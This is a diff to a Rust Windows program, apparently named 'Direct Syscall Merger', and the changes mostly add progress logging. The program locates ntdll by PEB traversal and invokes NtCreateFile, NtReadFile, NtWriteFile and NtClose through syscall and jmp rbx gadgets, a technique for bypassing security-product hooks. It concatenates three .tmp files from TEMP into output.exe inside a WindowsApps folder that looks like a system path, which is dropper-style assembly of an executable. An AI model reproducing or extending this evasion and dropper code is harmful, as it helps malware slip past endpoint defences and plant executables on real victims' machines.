@@ -53,12 +53,15 @@ fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
 }
 
 fn main() {
+    println!("[*] Starting Direct Syscall Merger...");
+
     unsafe {
         let ntdll_base = syscalls::get_ntdll_base();
         if ntdll_base.is_null() {
-            eprintln!("[-] Failed to get ntdll base");
+            println!("[-] Failed to get ntdll base via PEB traversal.");
             return;
         }
+        println!("[+] Found ntdll.dll at: {:?}", ntdll_base);
 
         let nt_create_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtCreateFile").expect("Failed to get NtCreateFile SSN");
         let nt_read_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtReadFile").expect("Failed to get NtReadFile SSN");
@@ -68,15 +71,31 @@ fn main() {
         let syscall_gadget = syscalls::find_syscall_gadget(ntdll_base as *const u8).expect("Failed to find syscall gadget");
         let jmp_rbx_gadget = syscalls::find_jmp_rbx_gadget(ntdll_base as *const u8).expect("Failed to find jmp rbx gadget");
 
-        let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
-        let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Local".to_string());
+        println!("[*] Syscall Gadget: {:?}", syscall_gadget);
+        println!("[*] JMP RBX Gadget: {:?}", jmp_rbx_gadget);
+
+        let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| {
+            println!("[!] TEMP environment variable not found, using default.");
+            "C:\\Windows\\Temp".to_string()
+        });
+        let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| {
+            println!("[!] LOCALAPPDATA environment variable not found, using default.");
+            "C:\\Users\\Default\\AppData\\Local".to_string()
+        });
+
+        println!("[*] TEMP directory: {}", temp_dir);
+        println!("[*] LOCALAPPDATA directory: {}", local_app_data);
 
         let target_dir = format!("{}\\Microsoft\\WindowsApps", local_app_data);
-        let _ = std::fs::create_dir_all(&target_dir);
+        if let Err(e) = std::fs::create_dir_all(&target_dir) {
+            println!("[!] Warning: Failed to create target directory {}: {}", target_dir, e);
+        }
 
         let out_path_str = format!("{}\\output.exe", target_dir);
         let out_path_wide = to_nt_path(&out_path_str);
         let out_unicode = create_unicode_string(&out_path_wide);
+
+        println!("[*] Target file path: {}", out_path_str);
 
         let mut out_handle: HANDLE = 0;
         let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
@@ -107,10 +126,10 @@ fn main() {
         );
 
         if status != 0 {
-            eprintln!("[-] NtCreateFile (output) failed with status: 0x{:08X}", status);
+            println!("[-] NtCreateFile (output) failed with status: 0x{:08X}", status as u32);
             return;
         }
-        println!("[+] Successfully created output file: {}", out_path_str);
+        println!("[+] Successfully opened/created output file handle: {:?}", out_handle);
 
         for i in 1..=3 {
             let in_path_str = format!("{}\\{}.tmp", temp_dir, i);
@@ -147,6 +166,7 @@ fn main() {
             if status == 0 {
                 println!("[+] Merging {}...", in_path_str);
                 let mut buffer = [0u8; 8192];
+                let mut total_read = 0;
                 loop {
                     let mut read_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                     let status = syscall!(
@@ -166,7 +186,7 @@ fn main() {
 
                     if status != 0 {
                         if status as u32 != 0xC0000011 { // STATUS_END_OF_FILE
-                            eprintln!("[-] NtReadFile failed with status: 0x{:08X}", status);
+                            println!("[-] NtReadFile failed with status: 0x{:08X}", status as u32);
                         }
                         break;
                     }
@@ -174,6 +194,8 @@ fn main() {
                     if read_io_status.Information == 0 {
                         break;
                     }
+
+                    total_read += read_io_status.Information;
 
                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                     let status = syscall!(
@@ -192,17 +214,18 @@ fn main() {
                     );
 
                     if status != 0 {
-                        eprintln!("[-] NtWriteFile failed with status: 0x{:08X}", status);
+                        println!("[-] NtWriteFile failed with status: 0x{:08X}", status as u32);
                         break;
                     }
                 }
+                println!("[+] Merged {} bytes from {}", total_read, in_path_str);
                 syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, in_handle as usize);
             } else {
-                eprintln!("[-] Failed to open {} for reading, status: 0x{:08X}", in_path_str, status);
+                println!("[-] Failed to open {} for reading, status: 0x{:08X}", in_path_str, status as u32);
             }
         }
 
         syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
-        println!("[+] Done.");
+        println!("[+] Process complete.");
     }
 }
